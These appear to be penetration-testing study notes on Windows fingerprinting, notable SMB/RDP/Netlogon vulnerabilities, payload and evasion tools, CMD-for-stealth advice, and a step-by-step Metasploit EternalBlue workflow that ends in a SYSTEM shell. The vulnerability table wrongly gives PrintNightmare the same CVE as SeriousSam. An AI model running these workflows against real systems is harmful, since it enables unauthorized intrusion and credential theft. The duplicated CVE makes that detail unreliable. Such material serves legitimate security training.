# Windows Enumeration and Exploitation Fundamentals

## Windows Fingerprinting Methods

Identifying the operating system is the first step in determining the available attack surface. Use these methods to confirm a target is running Windows.

### ICMP TTL Analysis

When using `ping`, the **Time to Live (TTL)** value in the response indicates the OS type.

- **Windows TTL:** Typically **128** (or 32).
- **Significance:** Most hosts are within 20 hops; a value near 128 is a reliable indicator even across layer 3 networks.

### Nmap OS Identification

Use Nmap to analyze the TCP/IP stack for more granular versioning.

|Command|Purpose|
|:--|:--|
|`sudo nmap -v -O <TARGET_IP>`|Standard **OS Identification** scan.|
|`sudo nmap -v -A -Pn <TARGET_IP>`|**Aggressive scan**; use if standard scans fail or are blocked.|

**Implications:** Successful identification (e.g., Windows 10 1709-1909) allows for targeted exploit research. Firewalls can obscure these results; always use multiple checks.

### Banner Grabbing

Glean service-specific information from open ports.

|Command|Purpose|
|:--|:--|
|`sudo nmap -v <TARGET_IP> --script banner.nse`|Connects to ports to retrieve **service banners**.|

---

## Notable Windows Exploits

These vulnerabilities frequently provide initial access or administrative privileges in Windows environments.

|Vulnerability|Identifier|Description|Attack Implication|
|:--|:--|:--|:--|
|**MS08-067**|MS08-067|SMB flaw used by Conficker and Stuxnet.|Highly efficient remote infiltration.|
|**EternalBlue**|MS17-010|SMB v1 flaw; famously used in WannaCry.|Remote Code Execution (RCE).|
|**PrintNightmare**|CVE 2021-36934|Windows Print Spooler RCE.|**System-level access** from a low-privilege shell.|
|**BlueKeep**|CVE 2019-0708|RDP protocol vulnerability.|RCE on Windows 2000 through Server 2008 R2.|
|**Sigred**|CVE 2020-1350|DNS SIG resource record flaw.|Potential **Domain Admin** privileges.|
|**SeriousSam**|CVE 2021-36934|Misconfigured permissions on `config` folder.|Allows reading SAM database via volume shadow copies to **dump credentials**.|
|**Zerologon**|CVE 2020-1472|Cryptographic flaw in Netlogon (MS-NRPC).|Trivial bypass of authentication to change account passwords.|

---

## Payload Generation & Delivery

The choice of payload depends on the delivery mechanism (e.g., phishing, web-drive-by) and the target's execution environment.

### Payload Types

- **DLLs / .bat / .msi:** Common executable formats for Windows.
- **PowerShell Scripts:** Leverages native automation for memory-resident execution.

### Tool Reference

|Resource|Description|
|:--|:--|
|**MSFVenom**|OS-agnostic payload generator and encoder.|
|**Mythic C2**|Command and Control framework for unique payload generation.|
|**Nishang**|Framework of **offensive PowerShell** implants and scripts.|
|**Darkarmour**|Generates **obfuscated binaries** to evade detection.|

---

## Operational Workflow: Exploiting MS17-010 (EternalBlue)

Use this workflow when a Windows Server (2008 to 2016) is identified with SMB (Port 445) open.

### 1. Vulnerability Validation

Confirm the target is susceptible before attempting exploitation.

```
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run
```

### 2. Exploit Configuration

Select the appropriate module and set connection parameters.

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET_IP>
set LHOST <ATTACK_IP>
set LPORT <PORT>
```

### 3. Execution & Verification

Launch the attack to obtain a Meterpreter session.

```
exploit
getuid  # Verify you are NT AUTHORITY\SYSTEM
shell   # Drop into a native OS shell
```

---

## Shell Selection: CMD vs. PowerShell

The "correct" shell depends on the specific task and the need for stealth.

|Feature|CMD|PowerShell|
|:--|:--|:--|
|**Foundation**|Original MS-DOS shell.|Based on **.NET**.|
|**Input/Output**|Text-based.|**.NET Objects**.|
|**Stealth**|High; does not keep command history.|Lower; maintains command records.|
|**Evasion**|Ignores Execution Policy/UAC.|Inhibited by **Execution Policy and UAC**.|
|**Availability**|All versions.|Windows 7 and newer.|

**Decision Point:** Use **CMD** for stealth and to bypass basic security controls; use **PowerShell** for complex automation and modern .NET-based post-exploitation modules.

---

## Dangerous Misconfigurations

These settings provide immediate opportunities for exploitation if found during enumeration.

| Setting                   | Context                                  | Risk                                                                                              |
| :------------------------ | :--------------------------------------- | :------------------------------------------------------------------------------------------------ |
| **SMB Message Signing**   | Disabled (Default).                      | Vulnerable to relay attacks; identified via `smb-security-mode`.                                  |
| **Volume Shadow Copy**    | Backups of `C:\Windows\system32\config`. | Allows non-elevated users to read the SAM database if permissions are misconfigured (SeriousSam). |
| **WSL / PowerShell Core** | Cross-platform integration.              | **Blind spot:** Network requests from WSL are often not parsed by Windows Firewall or Defender.   |